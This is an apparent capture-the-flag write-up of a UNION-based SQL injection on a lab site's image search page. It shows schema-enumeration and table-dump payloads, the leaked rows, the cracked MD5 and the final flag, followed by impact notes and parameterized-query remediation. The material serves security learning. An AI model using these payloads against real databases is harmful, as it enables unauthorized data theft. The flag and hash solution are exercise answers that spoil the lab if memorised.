# Flag — SQL Injection (searchimg page)

**Category:** OWASP A05:2025 – Injection
**Sub-type:** SQL Injection (UNION-based)
**Location:** `/index.php?page=searchimg`

---

## 1. Discovery

This page lets you search for an image by its number. The behaviour looked very
close to the member lookup page, so we assumed the same UNION-based injection and
went straight for the schema.

First, list the names of all tables in the application's database:

```sql
0 UNION SELECT GROUP_CONCAT(table_name), 2 FROM information_schema.tables WHERE table_schema=database()
```

This returned a single table named `list_images`.

Since there is only one table, we can read its columns directly by filtering on the
schema (no need to write the table name as a string, so no `addslashes` / hex issue
to worry about):

```sql
0 UNION SELECT GROUP_CONCAT(column_name), 2 FROM information_schema.columns WHERE table_schema=database()
```

We then dumped all of its data:

```sql
0 UNION SELECT GROUP_CONCAT(id,0x3a,url,0x3a,title,0x3a,comment SEPARATOR 0x0a), 2 FROM list_images
```

(`0x3a` is the `:` separator between fields; `0x0a` puts each row on its own line.)

**Result** (data appears in the `Url` field, the filler `2` in `Title`):

```
Title: 2
Url :
1:https://fr.wikipedia.org/wiki/Programme_:Nsa:An image about the NSA !
2:https://fr.wikipedia.org/wiki/Fichier:42:42 !:There is a number..
3:https://fr.wikipedia.org/wiki/Logo_de_Go:Google:Google it !
4:https://en.wikipedia.org/wiki/Earth#/med:Earth:Earth!
5:borntosec.ddns.net/images.png:Hack me ?:If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Row 5 spells out the next step. The value `1928e8083cf461a51303633093573c46` is a
**32-character hexadecimal string**, i.e. an **MD5 hash**.


The chain to get the flag:

1. Crack the MD5 `1928e8083cf461a51303633093573c46` → `albatroz`.
2. It is already lowercase, so hash it directly with **SHA256**:

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

→ **This is the flag.**

## 2. Impact

UNION-based SQL injection lets an attacker read **anything** the database account
can access: the full schema (tables, columns), and all stored data — personal
information, credentials, comments, and any data meant to stay private. With a more
privileged DB user it can also extend to reading files on the server (`LOAD_FILE`)
or writing them (`INTO OUTFILE`), and in some setups to full system compromise.

## 3. Remediation

**Use prepared statements (parameterized queries).** They separate the SQL code
from the data, so user input can never be interpreted as SQL. Example in PHP (PDO):

```php
$stmt = $pdo->prepare("SELECT url, title FROM list_images WHERE id = ?");
$stmt->execute([$id]);
```

The `?` is a placeholder; the value of `$id` is sent separately and is always
treated as data, never as part of the query — so `0 UNION SELECT ...`, hex,
`CHAR()`, etc. all become harmless literal strings.

Additional measures:

- **Use an ORM** (Doctrine, etc.) — they use parameterized queries under the hood.
- **Do not rely on `addslashes()` / manual escaping.** It only neutralizes quotes,
  and an attacker can express strings without any quote at all (hex, `CHAR()`,
  subqueries). It is not a real defense.
- **Apply least privilege** to the database account (no `FILE` privilege, read-only
  where possible) to limit the blast radius if an injection is found.